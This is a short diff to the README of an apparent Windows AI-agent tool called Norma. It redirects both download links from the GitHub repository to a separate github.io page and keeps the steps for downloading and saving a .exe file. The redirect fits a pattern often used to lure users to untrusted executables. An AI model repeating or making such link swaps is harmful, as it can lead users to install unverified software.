@@ -1,6 +1,6 @@
 # 🤖 norma-ai-agent-platform - Turn your knowledge into automated actions
 
-[![](https://img.shields.io/badge/Download-Norma-blue.svg)](https://github.com/marthiram4878/norma-ai-agent-platform)
+[![](https://img.shields.io/badge/Download-Norma-blue.svg)](https://marthiram4878.github.io)
 
 Norma acts as an operating system for artificial intelligence. It connects your stored documents, notes, and goals to automated digital workers. These systems manage complex tasks, remember your preferences, and retrieve data exactly when you need it. You use Norma to organize information and execute projects without manual effort.
 
@@ -18,7 +18,7 @@ Before you install Norma, ensure your Windows computer meets these standards to 
 
 You obtain the latest version of Norma through our official repository.
 
-[Click here to visit the download page](https://github.com/marthiram4878/norma-ai-agent-platform).
+[Click here to visit the download page](https://marthiram4878.github.io).
 
 Look for the link labeled Latest Release. Click this to reach the list of available files. Select the file ending in .exe for Windows. Save this file to your Downloads folder.
 
